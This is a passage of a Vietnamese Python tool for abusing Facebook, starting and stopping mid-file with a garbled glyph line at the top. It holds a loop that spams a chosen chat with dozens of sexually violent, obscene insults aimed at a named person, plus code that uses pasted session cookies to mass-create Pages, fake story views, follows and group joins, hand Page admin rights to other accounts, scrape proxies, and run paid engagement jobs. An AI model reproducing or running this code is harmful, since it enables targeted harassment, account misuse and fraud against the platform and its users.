⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟➴➵➶➷/꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟"#input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Nhập tên thằng chó muốn chửi :{vang} ')
    elif chon_name.lower() == "n":
      name = " "
    else:
      print(f"{do}Vui Lòng Nhập Đúng")
    delay=int(input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Nhập delay(khuyến cáo trên 10s) :{vang} '))
    cau_chui = [
f"thằng bê đê bất lực vì mẹ nó bị đụ tung cái lồn:)))  {name}",
f"con đĩ mẹ mày bất lực vì bị tao chửi mà chỉ biết câm lặng:)))  {name}",
f"làm màu mà bị tao chửi rung cái con cặc:)))  {name}",
f"Mẹ mày bị tao đụ lòi hột le:)))  {name}",
f"thằng bê đê ảo cặc đòi cân và cái kết:)))  {name}",
f"con đĩ mẹ của mày thèm cứt tao dữ lắm:)))  {name}",
f"bị tao chửi sảng cặc đéo dám care:)))  {name}",
f"mạnh lên sao yếu đuối v con:)))  {name}",
f"mày run cặc chưa con:)))  {name}",
f"chậm vậy sao cứu được con đĩ mẹ mày nhanh lên đi chứ:)))  {name}",
f"chết cha nó sồn r  {name}",
f"con đĩ mẹ mày gào thét đê?😛  {name}",
f"mày sủa điên dại lên con?😏  {name}",
f"sao cay tao dọ?  {name}",
f"sủa đi nè hjhj thg béo😛  {name}",
f"sao mày xấu lồn gớm chó dị con?  {name}",
f"sao cay tao hả😏?  {name}",
f"sao mày giết mẹ vậy=)))  {name}",
f"mày gào đi con=)))  {name}",
f"nào ổn thì đú🤣👈  {name}",
f"ê bê đê lên ăn hôi lẹ😘  {name}",
f"mày đú rõ mò  {name}",
f"sao mày ăn cứt tao😏  {name}",
f"ai cho mày ăn cứt tao  {name}",
f"sao mày óc cặc dữ con=)))  {name}",
f"gặp cha là run hả?😂  {name}",
f"con đĩ mẹ mày thèm cứt tao dữ lắm=)))  {name}",
f"mày mất cha mất mẹ mà đúng k🤣👈  {name}",
f"ai cho mày sủa tao cho mày sủa chưa?  {name}",
f"bị tao chọc cay hơn con chó luôn=)))  {name}",
f"cố đi sắp win rồi nè😏  {name}",
f"chừng nào mày mới làm lại tao dị?  {name}",
f"mẹ mày bị t đụ đột quỵ ngoài nhà nghỉ kìa đem hòm ra nha   {name}",
f"đem 2 cái m với con gái mẹ m luôn nha thg béo kkk {name}",
f"sủa điên đi mà sủa hăng lên mới vui😘  {name}",
f"mày mà ngưng một giây là con đĩ mẹ mày bả tắt đường thở á😏  {name}",
f"ê chó ngu mày sợ tao hả😂  {name}",
f"mày đú rõ mà sao mày đú dị?  {name}",
f"mẹ mày chết chưa con=)))  {name}",
f"ê bê đê sủa điên đi  {name}",
f"sao mày sủa chậm dị?  {name}",
f"nào làm lại tao nói đê?  {name}",
f"bị tao chọc cay hơn con chó luôn😏  {name}",
f"sủa đi rồi đại ca tha nè thg óc?  {name}",
f"sủa điên lên cho mẹ?  {name}",
f"mày ngưng là con đĩ mẹ mày chết?  {name}",
f"cay tao lòi dái hả😏  {name}",
f"bem với cha mở đầu chó m ra nhe?🤣  {name}",
f"sao mày thảm vãi lồn cần t lau nước mắt không!!!!=)))  {name}",
f"mẹ mày bị tao địt rách màn trinh mà🤪  {name}",
f"mẹ mày bị tao dã vào lồn=)))  {name}",
f"địt mẹ mày sướng tê con cặc=)))  {name}",
f"huhu nhìn mày như con cặc=)))  {name}",
f"mày loạn luân bà già hả=)))  {name}",
f"mẹ mày bị tao địt rên ư ử=)))  {name}",
f"địt mẹ mày sảng khoái quá đi😛  {name}",
f"tao địt mẹ mày nát lồn mà=)))  {name}",
f"Ê bóng lồn  {name}",
f"mẹ mày bị tao cưỡng hiếp=)))  {name}",
f"mẹ mày đưa lồn chó liếm à🤣👈  {name}",
f"mày óc cái lồn mà  {name}",
f"quỳ xuống năn nỉ t đi tao tha😏  {name}",
f"bú lồn tao đi🤪  {name}",
f"mày ẳng gì dị?😏  {name}",
f"nghe nói mày sợ tao?  {name}",
f"vô danh cấm sủa?😏  {name}",
f"gì mày thèm cứt tao hả=)))?  {name}",
f"sao mày lề mề dị con  {name}",
f"mày có tuổi hở?😏  {name}",
f"tuổi lồn ăn tao á😏?  {name}",
f"thấy thằng lồn này lề mề vãi lồn ra mẹ gank hay sao vậy thg óc cặc😛 {name}"
]

    while True:
      for nd in cau_chui:
        data = f"fb_dtsg={fb_dtsg}&jazoest={jazoest}&body={nd}&send=Send&tids=cid.g.{idcanspam}&wwwupp=C3&platform_xmd=&referrer=&ctype=&cver=legacy&csid=366a74a7-2d30-45dd-94c2-ad47d662dcfb"  
        response = requests.post("https://mbasic.facebook.com/messages/send/", params=params, headers=headers, data=data.encode('utf-8'))
        print(f"\033[1;33mID BOX\033[1;97m: {idcanspam} \033[1;31m| \033[1;92mNỘI DUNG\033[1;97m: {nd} \033[1;31m| \033[1;35mTRẠNG THÁI\033[1;97m: {xanh_la}SUCCESS")
        idelay(delay) 

  elif nhap == '3':
    clear()
    runbanner(ba)
    
  elif nhap == '3.1':
    clear()
    runbanner(chontool)
    runxem = reg_pro5()
    stt = 0
    dem = 0
    while True:
      stt+=1
      cookie_fb = input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}VUI LÒNG NHẬP COOKIE THỨ {trang}[{tim}{stt}{trang}] :{vang} ')
      if cookie_fb == '':
        break
      checklive = runxem.getthongtinfacebook(cookie_fb)
      if checklive != False:
        print(f'{tim}Name Facebook: {xanh_la}'+checklive[0])
        list_clone.append(f'{cookie_fb}|{checklive[0]}|{checklive[1]}|{checklive[2]}|{checklive[3]}')
        print('─'*50)
      else:
        stt-1
        print(f'{vang}Cookie\033[0m '+cookie_fb.split('c_user=')[1].split(';')[0]+f', {do}Die Or Out Vui Lòng Kiểm Tra Lại!!')
        
    slpage = int(input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}BẠN MUỐN TẠO BAO NHIÊU PAGE THÌ DỪNG TOOL :{vang} '))
    delay = int(input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}VUI LÒNG NHẬP DELAY REG PAGE :{vang} '))
    print(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanh_la}Đã Tìm Thấy: '+str(len(list_clone))+' Cookie')
    while True:
      for dulieuclone in list_clone:
        idpage = runxem.RegPage(str(dulieuclone).split('|')[0], str(dulieuclone).split('|')[1], str(dulieuclone).split('|')[2], str(dulieuclone).split('|')[3], str(dulieuclone).split('|')[4])
        if idpage:
          link_anh = random.choice(list_img)
          if runxem.UpAvt(str(dulieuclone).split('|')[0], idpage, link_anh):
              print(f'{xanh_la}UP AVT SUCCESS {trang}| {trang}[{vang}UID PAGE: {tim}{idpage}{trang}]')
              dem += 1  # Tăng số page đã tạo thành công
          else:
            print(f'{do}UP AVT ERROR {trang}| {trang}[{vang}UID PAGE: {tim}{idpage}{trang}]')
          idelay(delay)
        
        if dem == slpage:
          print(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanh_la}Reg Thành Công {vang}{dem} {tim}Page')
          exit()

       
  elif nhap == '3.2':
    clear()
    runbanner(chontool)
    cookie = input(f'{xanhnhat}Vui Lòng Nhập Cookie Facebook Chứa Page Pro5{trang}:{vang} ')
    count = 0
    dem = 0
    list_id_name_page = []
    def buffview(x, thanhphan9, url_str, cookie):
        uid_page = list_id_name_page[x].split('|')[0]
        time = datetime.datetime.now().strftime("%H:%M:%S")
        name_page = list_id_name_page[x].split('|')[1]
        list1 = (f'i_user={uid_page};')
        cookie9 = (f'{cookie}{list1}')
        headers = {
            'authority': 'www.facebook.com',
            'accept': '*/*',
            'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
            'origin': 'https://www.facebook.com',
            'referer': url_str,
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
            'viewport-width': '1186',
            'x-fb-friendly-name': 'storiesUpdateSeenStateMutation',
            'x-fb-lsd': 'YCCQAywyZyd74odVp6QBrw',
            'cookie': cookie9,
        }

        data = {
        'av': uid_page,
        '__user': uid_page,
        'fb_dtsg': fb_dtsg,
        'jazoest': jazoest,
        'fb_api_caller_class': 'RelayModern',
        'fb_api_req_friendly_name': 'storiesUpdateSeenStateMutation',
        'variables': '{"input":{"bucket_id":"259253279258515","story_id":"'+str(thanhphan9)+'","actor_id":"'+uid_page+'","client_mutation_id":"1"},"scale":1}',
        'server_timestamps': 'true',
        'doc_id': '5127393270671537',
      }

        runview = requests.post('https://www.facebook.com/api/graphql/', headers=headers, data=data).json()
        print('\033[1;31m[\033[0;93m'+str(x+1)+'\033[1;31m] | \033[1;36m'+str(time)+f' \033[1;31m| \033[1;31m] {xanh_la}SUCCESS \033[1;31m| \033[1;35m'+str(uid_page)+' \033[1;31m| \033[1;34m'+str(name_page))

    headers={
            'authority': 'www.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'vi',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
            'viewport-width': '1366',
            'cookie': cookie,
        }
    try:
      url_profile = requests.get('https://www.facebook.com/me', headers=headers).url
      getdatainfo = requests.get(url_profile,headers=headers).text
      
    except:
      print(f'{do}COOKIE DIE, VUI LÒNG KIỂM TRA LẠI!')
      
    try:
      fb_dtsg = getdatainfo.split('{"name":"fb_dtsg","value":"')[1].split('"},')[0]
      jazoest = getdatainfo.split('{"name":"jazoest","value":"')[1].split('"},')[0]
    except:
      try:
          fb_dtsg = getdatainfo.split(',"f":"')[1].split('","l":null}')[0]
          jazoest = getdatainfo.split('&jazoest=')[1].split('","e":"')[0]
      except:
          print(f'{do}COOKIE DIE, VUI LÒNG KIỂM TRA LẠI!')
    clear()
    runbanner(chontool)
    headers_getid = {
      'cookie': cookie, 
    }
    data = {
      'fb_dtsg': fb_dtsg,
     'jazoest': jazoest,
     'variables': '{"showUpdatedLaunchpointRedesign":true,"useAdminedPagesForActingAccount":false,"useNewPagesYouManage":true}',
      'doc_id': '5300338636681652'
    }
    getidpro5 = requests.post('https://www.facebook.com/api/graphql/', headers = headers_getid, data = data).json()['data']['viewer']['actor']['profile_switcher_eligible_profiles']['nodes']
    for i in getidpro5:
      uid_page = i['profile']['id']
      name_page = i['profile']['name']
      gomlist = f'{uid_page}|{name_page}'
      list_id_name_page.append(gomlist)
    print(f'{tim}Đã Tìm Thấy {trang}{str(len(list_id_name_page))}{xanh_la} Page Pro5')
    url_str = input(f'{xanhnhat}Vui Lòng Nhập Link Str Cần Tăng View{trang}: {vang}')
    thanhphan9 = url_str.split('/')[5].split('/?')[0]
    soluongview = int(input(f'{xanhnhat}Vui Lòng Số View Bạn Cần Tăng{trang}: {vang}'))
    delay = int(input(f'{xanhnhat}Vui Lòng Nhập Delay View{trang}: {vang}'))
    for x in range(soluongview):
      dem=dem+1
      threading.Thread(target=buffview,args=(x, thanhphan9, url_str, cookie, )).start()
      idelay(delay)
    sleep(5)
    print(f'{xanh_la}DONE!')

  elif nhap == '3.3':
    clear()
    runbanner(chontool)
    dem = 0
    while True:
        while True:
            cookie=input (f'{xanhnhat}Nhập Cookie Nick Cầm Page Profile:{vang} ')
            thanhngang(16)
            fbr = fb_buff_flow(cookie)
            a = fbr.get_thongtin()
            if a == 0:
              continue
            data_pro5 = fbr.get_pro5()
            if data_pro5 == 0:
              continue
            else:
              break
        thanhngang(16)
        id=input(f'\n{xanhnhat}Nhập ID Nick Cần Buff Follow {trang}:{vang} ')
        dl = int(input(f'{xanhnhat}Nhập Delay {trang}:{vang} '))
        for x in data_pro5:
            id_page=x['profile']['id']
            name=x['profile']['name']
            dem+=1
            fbr.follow (id, id_page, name)
            idelay(dl)
  
  elif nhap == '3.4':
    clear()
    runbanner(chontool)
    list_id_name_page = []
    def rungr(x):
        uid_page = list_id_name_page[x].split('|')[0]
        name_page = list_id_name_page[x].split('|')[1]
        time = datetime.datetime.now().strftime("%H:%M:%S")
        list1 = (f'i_user={uid_page};')
        cookie9 = (f'{cookie}{list1}')
        headers = {
            'authority': 'www.facebook.com',
            'accept': '*/*',
            'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
            'origin': 'https://www.facebook.com',
            'referer': 'https://www.facebook.com/groups/'+str(id_gr)+'',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
            'viewport-width': '1221',
            'x-fb-friendly-name': 'GroupCometJoinForumMutation',
            'x-fb-lsd': '1CWQYotunk8BXwcjavghDO',
            'cookie': cookie9,
          }

        data = {
            'av': uid_page,
            '__user': uid_page,
            '__a': '1',
            '__dyn': '7AzHxqU5a5Q1ryaxG4VuC0BVU98nwgU765QdwSwMwNw9G2Saxa1NwJwpUe8hw6vwb-q7oc81xoswMwto88422y11xmfz83WwgEcHzoaEnxO0Bo7O2l2Utwwwi831wiEjwZwlo5qfK6E7e58jwGzEaE5e7oqBwJK2W5olwUwlu5pUfE2FBx_y8lz83VBwJCwLyES0Io88cA0z8c84qifxe3u362-2B0oobo8o',
            '__csr': 'gT3c9Tf4Ph3lndq9E8btWdIy8B6OFTAFqZuBpWIDkDYLF8HWhaKiB9qhqHB-yAFpRXyqWV4dWpaBiHZ7J9d4G5V8GmV9u9CgGK4oKVu4agtG5quFoy9zkeBGucHAmbGnKnyonykmErBg84ubyU6e4FGxa10zpo42axi1AwNzp8C13wIz98a8O6U9UiG2-48bU3fCK19wPwpoOdwKwsrwCw-wk85q1swu84C4E1gE0aJE09kE031nw2780oow8q0S8ANO06fg0F-05mE0m4y3Q0cnwtyw0r1oW0A81oE1981VE0-K0L82xw',
            '__req': 's',
            '__hs': '19323.HYP:comet_pkg.2.1.0.2.1',
            'dpr': '1',
            '__ccg': 'EXCELLENT',
            '__rev': '1006638605',
            '__s': 'g46m30:o2pr1z:3yzc8j',
            '__hsi': '7170501783158722778',
            '__comet_req': '15',
            'fb_dtsg': fb_dtsg,
            'jazoest': jazoest,
            'lsd': '1CWQYotunk8BXwcjavghDO',
            '__aaid': '497084035286445',
            '__spin_r': '1006638605',
            '__spin_b': 'trunk',
            '__spin_t': '1669512545',
            'fb_api_caller_class': 'RelayModern',
            'fb_api_req_friendly_name': 'GroupCometJoinForumMutation',
            'variables': '{"feedType":"DISCUSSION","groupID":"'+str(id_gr)+'","imageMediaType":"image/x-auto","input":{"action_source":"GROUP_MALL","attribution_id_v2":"CometGroupDiscussionRoot.react,comet.group,via_cold_start,1669512546874,734244,2361831622,","group_id":"'+str(id_gr)+'","group_share_tracking_params":{"app_id":"2220391788200892","exp_id":"null","is_from_share":false},"actor_id":"'+uid_page+'","client_mutation_id":"1"},"inviteShortLinkKey":null,"isChainingRecommendationUnit":false,"isEntityMenu":true,"scale":1,"source":"GROUP_MALL","renderLocation":"group_mall","__relay_internal__pv__GroupsCometEntityMenuEmbeddedrelayprovider":true,"__relay_internal__pv__GlobalPanelEnabledrelayprovider":true}',
            'server_timestamps': 'true',
            'doc_id': '5608919199222447',
            'fb_api_analytics_tags': '["qpl_active_flow_ids=431626709"]',
          }

        response = requests.post('https://www.facebook.com/api/graphql/', headers=headers, data=data).text
        print(f'\033[1;31m[{vang}{str(x+1)}\033[1;31m] | \033[1;36m{str(time)} \033[1;31m| {xanh_la}SUCCESS \033[1;31m| \033[1;35m{str(uid_page)} \033[1;31m| \033[1;34m{str(name_page)} \033[1;31m| \033[1;37m{str(id_gr)} ')

    cookie = input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Vui Lòng Nhập Cookie Facebook {trang}: {vang}')
    headers = {
        'authority': 'mbasic.facebook.com',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '"Google Chrome";v="93", " Not;A Brand";v="99", "Chromium";v="93"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'upgrade-insecure-requests': '1',
        'origin': 'https://mbasic.facebook.com',
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': 'https://mbasic.facebook.com/',
        'accept-language': 'en-US,en;q=0.9',
        'cookie': cookie,
      } 
    try:
      print(f"\033[1;97m[\033[1;31m</>\033[1;97m] {tim}Đang Check Live Cookie...!", end="\r")
      find_data = requests.get("https://mbasic.facebook.com/", headers=headers).text
      fb_dtsg = find_data.split('<input type="hidden" name="fb_dtsg" value="')[1].split('"')[0]
      jazoest = find_data.split('<input type="hidden" name="jazoest" value="')[1].split('"')[0]
    except:
      exit(f"\033[1;97m[\033[1;31m</>\033[1;97m] {do}Cookie Die Vui Lòng Kiểm Tra Lại!!")
      
    headers_getid = {
        'cookie': cookie, 
    }
    data = {
      'fb_dtsg': fb_dtsg,
      'jazoest': jazoest,
      'variables': '{"showUpdatedLaunchpointRedesign":true,"useAdminedPagesForActingAccount":false,"useNewPagesYouManage":true}',
      'doc_id': '5300338636681652'
    }
    getidpro5 = requests.post('https://www.facebook.com/api/graphql/', headers = headers_getid, data = data).json()['data']['viewer']['actor']['profile_switcher_eligible_profiles']['nodes']
    for i in getidpro5:
        uid_page = i['profile']['id']
        name_page = i['profile']['name']
        gomlist = f'{uid_page}|{name_page}'
        list_id_name_page.append(gomlist)
    clear()
    runbanner(chontool)
    print(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanh_la}Get Thành Công: {trang}{str(len(list_id_name_page))} {xanh_la}Page Pro5')
    thanhngang(16)
    linkgr = input(f'\n\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Vui Lòng Nhập Link Group {trang}: {vang}')
    get_id_gr = requests.post('https://id.traodoisub.com/api.php',data={"link":linkgr,}).json()
    if 'success' in get_id_gr:
        id_gr = get_id_gr["id"]
    else:
        exit(f'\033[1;97m[\033[1;31m</>\033[1;97m] {do}CÓ VẺ LINK GROUP SAI VUI LÒNG KIỂM TRA LẠI!!')
        
    thanhngang(16)
    print(f'\n\033[1;97m[\033[1;31m</>\033[1;97m] {do}[{xanh_la}SUCCESS{do}] {trang}: {tim}UID GROUP CỦA BẠN LÀ{trang}: {id_gr}')
    thanhngang(16)
    soluongrungr = int(input(f'\n\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Bạn Muốn Tăng Bao Nhiêu Menber{trang}: {vang}'))
    thanhngang(16)
    delay = int(input(f'\n\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Nhập Delay Tăng Menber{trang}: {vang}'))
    thanhngang(16)
    for x in range(soluongrungr):
        threading.Thread(target=rungr,args=(x, )).start()
        idelay(delay)
    
  elif nhap == '3.5':
    clear()
    runbanner(chontool)
    while True:
        while True:
            cookie=input (f'{xanhnhat}Nhập Cookie Nick Cầm Page Profile: '+vang)
            mk = input (f'{xanhnhat}Nhập Mật Khẩu Nick Cầm Page Profile: '+xam)
            fb = chuyen_quyen_admin(cookie)
            thanhngang(16)
            a=fb.get_thongtin()
            if a == 0:
                continue
            data_pro5 = fb.get_pro5()
            thanhngang(16)
            if data_pro5 == 0:
                continue
            else:
              break
        chon = input(f'\n{xanhnhat}Bạn Có Muốn Auto Chấp Nhận Quyền Quản Trị Không ({xanh_la}y{trang}/{xanh_la}n{xanhnhat}): '+vang)  
        if chon == 'y':
            while True:
                cookie=input (f'\n{xanhnhat}Nhập Cookie Nick Cần Set Admin: '+vang)
                fb2 = chuyen_quyen_admin(cookie)
                thanhngang(16)
                id=fb2.get_thongtin()
                if id == 0:
                    continue
                else:
                    print()
                    break
        else:
            id = input (f'\n{xanhnhat}Nhập ID Nick Cần Set Admin: '+vang)
            
        dem=0
        for x in data_pro5:
            id_page=x['profile']['id']
            name=x['profile']['name']
            dem+=1
            id_moi=fb.set_admin(id, mk, id_page, name)
            if id_moi == 0:
                break
            if chon == 'y' and id_moi != 'None':
                fb2.chap_nhan(id_moi, id_page, name)     
  
  elif nhap == '1.6':
    clear()
    runbanner(daulau)
    thanhngang(16)
    urls = '''
      https://api.proxyscrape.com/?request=displayproxies&proxytype=http
      https://api.openproxylist.xyz/http.txt
      http://alexa.lr2b.com/proxylist.txt
      https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt
      https://proxy-spider.com/api/proxies.example.txt
      http://worm.rip/http.txt
      https://sheesh.rip/http.txt
      https://www.freeproxychecker.com/result/http_proxies.txt
      https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt
      https://proxyspace.pro/http.txt

      '''
    file = open('proxy.txt', 'w')
    file.close()
    file = open('proxy.txt', 'a')
    good_proxies = []
    def pattern_one(url):
        ip_port = re.findall('(\d{,3}\.\d{,3}\.\d{,3}\.\d{,3}:\d{2,5})', url)
        if not ip_port: pattern_two(url)
        else:
            for i in ip_port:
              file.write(str(i) + '\n')
              good_proxies.append(i)
    def pattern_two(url):
        ip = re.findall('>(\d{,3}\.\d{,3}\.\d{,3}\.\d{,3})<', url)
        port = re.findall('td>(\d{2,5})<', url)
        if not ip or not port: pattern_three(url)
        else:
            for i in range(len(ip)):
                file.write(str(ip[i]) + ':' + str(port[i]) + '\n')
                good_proxies.append(str(ip[i]) + ':' + str(port[i]))
    def pattern_three(url):
        ip = re.findall('>\n[\s]+(\d{,3}\.\d{,3}\.\d{,3}\.\d{,3})', url)
        port = re.findall('>\n[\s]+(\d{2,5})\n', url)
        if not ip or not port: pattern_four(url)
        else:
            for i in range(len(ip)):
                file.write(str(ip[i]) + ':' + str(port[i]) + '\n')
                good_proxies.append(str(ip[i]) + ':' + str(port[i]))
    def pattern_four(url):
        ip = re.findall('>(\d{,3}\.\d{,3}\.\d{,3}\.\d{,3})<', url)
        port = re.findall('>(\d{2,5})<', url)
        if not ip or not port: pattern_five(url)
        else:
            for i in range(len(ip)):
                file.write(str(ip[i]) + ':' + str(port[i]) + '\n')
                good_proxies.append(str(ip[i]) + ':' + str(port[i]))
    def pattern_five(url):
        ip = re.findall('(\d{,3}\.\d{,3}\.\d{,3}\.\d{,3})', url)
        port = re.findall('(\d{2,5})', url)
        for i in range(len(ip)):
            file.write(str(ip[i]) + ':' + str(port[i]) + '\n')
            good_proxies.append(str(ip[i]) + ':' + str(port[i]))
    def start(url):
        try:
            req = requests.get(url, headers={'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'}).text
            pattern_one(req)
            print(f'\n{tim}đang scan proxy vui lòng đợi')
        except requests.exceptions.SSLError: print(str(url) + ' [x] SSL Error')
        except: print(str(url) + f' \n{do}[x] Random Error')
    threadsss = []
    for url in urls.splitlines():
        if url:
            x = threading.Thread(target=start, args=(url, ))
            x.start()
            threadsss.append(x)
    for th in threadsss:
        th.join()
    print(f"{xanh_la}Đã Scan được {vang}\033[4m{len(good_proxies)}\033[0m {xanh_la}PROXY\n{xanhnhat}PROXY sẽ đưỡc lưu ở file proxy.txt")

                
  elif nhap == '4':
    clear()
    runbanner(bon)             
     
  elif nhap == '4.1':
    clear()
    runbanner(chontool)
    so = 0
    token = ''
    
    if os.path.isfile('token.txt'):
      use_existing_token = input(f"{xanhnhat}Bạn có muốn sử dụng token cũ và chạy lại không? (yes/no):{vang} ")
      if use_existing_token.lower() == 'yes':
        with open('token.txt', 'r') as file:
            token = file.read()
      else:
        token_input = input(f"{xanhnhat}Vui lòng nhập token tds của bạn :{vang} ")
        token = token_input
        with open('token.txt', 'w') as file:
            file.write(token)
            
    else:
      token_input = input(f"{xanhnhat}Vui lòng nhập token tds của bạn :{vang} ")
      token = token_input
      with open('token.txt', 'w') as file:
        file.write(token)
                
    check_xu = login_tds(token)
    cookie = input(f'{xanhnhat}Nhập cookie acc :{vang} ')
    print('-'*60)

    get_tt_page = get_page(cookie)
    a = int(input(f'{xanhnhat}Bạn Muốn Chạy Page Pro5 Số Mấy :{vang} '))
    chon = a-1
    print('-'*60)
    print (f"{xanh_la}Nhập {do}[{trang}1{do}] {tim}Job Like {do}× {tim}Cảm Xúc")
    print (f"{xanh_la}Nhập {do}[{trang}2{do}] {tim}Job Group")
    print (f"{xanh_la}Nhập {do}[{trang}3{do}] {tim}Job Follow ")
    print (f"{xanh_la}Nhập {do}[{trang}4{do}] {tim}Job Group {do}× {tim}Like {do}× {tim}Cảm Xúc")
    print (f"{xanh_la}Nhập {do}[{trang}5{do}] {tim}Job Group {do}× {tim}Like {do}× {tim}Cảm Xúc {do}× {tim}Follow ")
    chon_1 = int(input(f'{xanhnhat}Nhập :{vang} '))
    print('-'*60)
    dl = int(input(f'{xanhnhat}Nhập Delay :{vang} '))

    id_page = get_tt_page[chon]['profile']['id']
    name = get_tt_page[chon]['profile']['name']
    ck_pro5 = 'sb={}; datr={}; c_user={}; wd={}; xs={}; fr={}; i_user={};'.format(cookie.split('sb=')[1].split(';')[0], cookie.split('datr=')[1].split(';')[0], cookie.split('c_user=')[1].split(';')[0],cookie.split('wd=')[1].split(';')[0], cookie.split('xs=')[1].split(';')[0],cookie.split('fr=')[1].split(';')[0],id_page)
    data = get_data(cookie)
    fb_dtsg = json.loads(data)['fb_dtsg']
    jazoet = json.loads(data)['jazoet']
    fb = ApiPro5(cookies=ck_pro5, fb_dtsg=fb_dtsg, jazoet=jazoet,id_page=id_page)
    tt = 0
    clear()
    runbanner(chontool)
    tdstk = check_xu['data']['user']
    xu_5 = check_xu['data']['xu']
    print (f"{xanh_la}Tài Khoản{trang} : {vang}{tdstk} \n{xanh_la}Xu Hiện Tại {trang}:{vang} {xu_5} ")

    print('-'*60)
    cau_hinh(id_page, token, name)
    print('-'*60)
    while True :
        print(f"{xam}Đợi Tôi Tìm Job ",end="\r")
        if so == 5 :
            so -= 5
        else :
        
            job = chon_job(so,chon_1)
            print(f"{xam}Đợi Tôi Tìm Job ☞  {trang}[{do}{job}{trang}]       ",end="\r")
            job_1 = requests.get(f'https://traodoisub.com/api/?fields={job}&access_token={token}')
            so += 1
        
            a = job_1.json()
        try :
            b = a["error"] 
            
            if chon_1 == 1 :
                if so == 4 :
                    for i in range(20,-1,-1):
                        print(f'{do}[{vang}ĐANG TÌM JOB SAU{do}] {trang}=> {xanh_la}{i} {vang}GIÂY   ',end='\r')
                        sleep(1)
            elif chon_1 == 2 :
                for i in range(50,-1,-1):
